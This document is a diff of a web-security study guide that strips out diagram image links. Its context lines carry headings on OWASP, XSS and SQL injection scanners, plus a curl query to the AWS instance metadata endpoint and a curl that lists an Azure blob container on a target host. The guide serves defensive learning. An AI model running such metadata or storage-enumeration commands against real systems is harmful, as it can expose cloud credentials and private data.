-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-2-imdsv2-protection-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-2-imdsv2-protection-handwritten.svg" alt="Handwritten: 26.2 IMDSv2 Protection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-2-imdsv2-protection-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-2-imdsv2-protection-diagram.svg" alt="Diagram: 26.2 IMDSv2 Protection" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-2-imdsv2-protection-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-2-imdsv2-protection-sticky.svg" alt="Sticky Note: 26.2 IMDSv2 Protection" width="30%">
-</a>
-
 
 
 ```bash
@@ -4118,16 +2757,6 @@ curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-da
 ```
 
 ### 26.3 Cloud Storage Enumeration
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-3-cloud-storage-enumeration-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-3-cloud-storage-enumeration-handwritten.svg" alt="Handwritten: 26.3 Cloud Storage Enumeration" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-3-cloud-storage-enumeration-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-3-cloud-storage-enumeration-diagram.svg" alt="Diagram: 26.3 Cloud Storage Enumeration" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/26-3-cloud-storage-enumeration-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/26-3-cloud-storage-enumeration-sticky.svg" alt="Sticky Note: 26.3 Cloud Storage Enumeration" width="30%">
-</a>
 
 
 
@@ -4149,16 +2778,6 @@ curl https://target.blob.core.windows.net/container?restype=container&comp=list
 ## 39. Security Automation Scripts
 
 ### Automated Security Headers Check (Python)
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/automated-security-headers-check-python-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/automated-security-headers-check-python-handwritten.svg" alt="Handwritten: Automated Security Headers Check (Python)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/automated-security-headers-check-python-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/automated-security-headers-check-python-diagram.svg" alt="Diagram: Automated Security Headers Check (Python)" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/automated-security-headers-check-python-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/automated-security-headers-check-python-sticky.svg" alt="Sticky Note: Automated Security Headers Check (Python)" width="30%">
-</a>
 
 
 
@@ -4190,16 +2809,6 @@ check_security_headers("https://example.com")
 ```
 
 ### SQLi Detection Heuristic Script
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sqli-detection-heuristic-script-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sqli-detection-heuristic-script-handwritten.svg" alt="Handwritten: SQLi Detection Heuristic Script" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sqli-detection-heuristic-script-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sqli-detection-heuristic-script-diagram.svg" alt="Diagram: SQLi Detection Heuristic Script" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sqli-detection-heuristic-script-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sqli-detection-heuristic-script-sticky.svg" alt="Sticky Note: SQLi Detection Heuristic Script" width="30%">
-</a>
 
 
 
@@ -4285,16 +2894,6 @@ def detect_sqli(endpoint, param, value):
 
 ### CVSS 3.1 Severity Distribution
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-severity-distribution-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-severity-distribution-handwritten.svg" alt="Handwritten: CVSS 3.1 Severity Distribution" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-severity-distribution-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-severity-distribution-diagram.svg" alt="Diagram: CVSS 3.1 Severity Distribution" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-severity-distribution-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/cvss-3-1-severity-distribution-sticky.svg" alt="Sticky Note: CVSS 3.1 Severity Distribution" width="30%">
-</a>
-
 
 | Rating | CVSS Score | Response SLA | Example |
 
@@ -4311,16 +2910,6 @@ def detect_sqli(endpoint, param, value):
 | Critical | 9.0-10.0 | 24 hours | RCE, authentication bypass |
 
 ### Risk Calculation Matrix
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/risk-calculation-matrix-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/risk-calculation-matrix-handwritten.svg" alt="Handwritten: Risk Calculation Matrix" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/risk-calculation-matrix-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/risk-calculation-matrix-diagram.svg" alt="Diagram: Risk Calculation Matrix" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/risk-calculation-matrix-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/risk-calculation-matrix-sticky.svg" alt="Sticky Note: Risk Calculation Matrix" width="30%">
-</a>
 
 
 
@@ -4339,16 +2928,6 @@ Low                 | Low    | Low    | Medium | Medium
 ## 42. Final Review
 
 ### OWASP Top 10 (2021) → Quick Reference
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-quick-reference-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-quick-reference-handwritten.svg" alt="Handwritten: OWASP Top 10 (2021) → Quick Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-quick-reference-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-quick-reference-diagram.svg" alt="Diagram: OWASP Top 10 (2021) → Quick Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-quick-reference-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-quick-reference-sticky.svg" alt="Sticky Note: OWASP Top 10 (2021) → Quick Reference" width="30%">
-</a>
 
 
 | # | Category | Key Prevention |
@@ -4376,16 +2955,6 @@ Low                 | Low    | Low    | Medium | Medium
 | A10 | SSRF | URL allowlists, block internal IPs |
 
 ### Key Command Reference
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/key-command-reference-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/key-command-reference-handwritten.svg" alt="Handwritten: Key Command Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/key-command-reference-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/key-command-reference-diagram.svg" alt="Diagram: Key Command Reference" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/key-command-reference-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/key-command-reference-sticky.svg" alt="Sticky Note: Key Command Reference" width="30%">
-</a>
 
 
 
@@ -4421,16 +2990,6 @@ curl -sI https://target.com | grep -i -E "security|policy|frame|content"
 ## TypeScript Implementations
 
 ### XSS Sanitizer & Detector
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-sanitizer-detector-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-sanitizer-detector-handwritten.svg" alt="Handwritten: XSS Sanitizer & Detector" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-sanitizer-detector-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-sanitizer-detector-diagram.svg" alt="Diagram: XSS Sanitizer & Detector" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/xss-sanitizer-detector-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/xss-sanitizer-detector-sticky.svg" alt="Sticky Note: XSS Sanitizer & Detector" width="30%">
-</a>
 
 
 The following TypeScript class implements a comprehensive XSS detection and sanitization engine. It scans input for reflected, stored, and DOM-based XSS vectors including script tags, event handlers, javascript: URLs, and eval() patterns. The sanitizer strips dangerous content while preserving safe HTML.
@@ -4637,16 +3196,6 @@ console.log(`\nSanitized output:\n${sanitized}`);
 ```
 
 ### SQL Injection Scanner
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-scanner-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-scanner-handwritten.svg" alt="Handwritten: SQL Injection Scanner" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-scanner-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-scanner-diagram.svg" alt="Diagram: SQL Injection Scanner" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-scanner-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-scanner-sticky.svg" alt="Sticky Note: SQL Injection Scanner" width="30%">
-</a>
 
 
 This TypeScript class implements a multi-strategy SQL Injection scanner. It tests payloads against common injection types: UNION-based extraction, error-based inference, blind boolean, time-based delays, and stacked queries. The scanner also generates tailored test payloads for different database backends.
@@ -4913,16 +3462,6 @@ for (const f of findings) {
 
 ### SQL Injection Attack Flow
 
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-attack-flow-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-attack-flow-handwritten.svg" alt="Handwritten: SQL Injection Attack Flow" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-attack-flow-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-attack-flow-diagram.svg" alt="Diagram: SQL Injection Attack Flow" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-attack-flow-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/sql-injection-attack-flow-sticky.svg" alt="Sticky Note: SQL Injection Attack Flow" width="30%">
-</a>
-
 
 The following sequence diagram illustrates the two primary paths of SQL injection: **error-based** injection (where database error messages leak schema information) and **UNION-based** injection (where the attacker appends result sets to extract data directly). Both paths exploit unsanitized user input concatenated into SQL queries.
 
@@ -4962,16 +3501,6 @@ sequenceDiagram
 ```
 
 ### OWASP Top 10 (2021) Threat Categories
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-threat-categories-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-threat-categories-handwritten.svg" alt="Handwritten: OWASP Top 10 (2021) Threat Categories" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-threat-categories-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-threat-categories-diagram.svg" alt="Diagram: OWASP Top 10 (2021) Threat Categories" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-threat-categories-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/owasp-top-10-2021-threat-categories-sticky.svg" alt="Sticky Note: OWASP Top 10 (2021) Threat Categories" width="30%">
-</a>
 
 
 This mindmap illustrates the ten OWASP Top 10 risk categories ranked by exploitation frequency and technical impact. Each category is accompanied by example attack vectors that demonstrate the real-world manifestation of the vulnerability.
@@ -5042,16 +3571,6 @@ mindmap
 ```
 
 ### Final One-Sentence Takeaway
-
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/final-one-sentence-takeaway-handwritten.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/final-one-sentence-takeaway-handwritten.svg" alt="Handwritten: Final One-Sentence Takeaway" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/final-one-sentence-takeaway-diagram.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/final-one-sentence-takeaway-diagram.svg" alt="Diagram: Final One-Sentence Takeaway" width="30%">
-</a>
-<a href="../../../assets/images/diagrams/cyber-security/05-web-security/final-one-sentence-takeaway-sticky.svg" target="_blank" rel="noopener">
-  <img src="../../../assets/images/diagrams/cyber-security/05-web-security/final-one-sentence-takeaway-sticky.svg" alt="Sticky Note: Final One-Sentence Takeaway" width="30%">
-</a>
 
 
 Web security is a layered discipline: secure code (parameterized queries, output encoding) forms the foundation, security headers (CSP, HSTS, XFO) provide browser-enforced defense, WAF/RASP adds runtime protection, and a mature bug bounty program validates everything continuously.
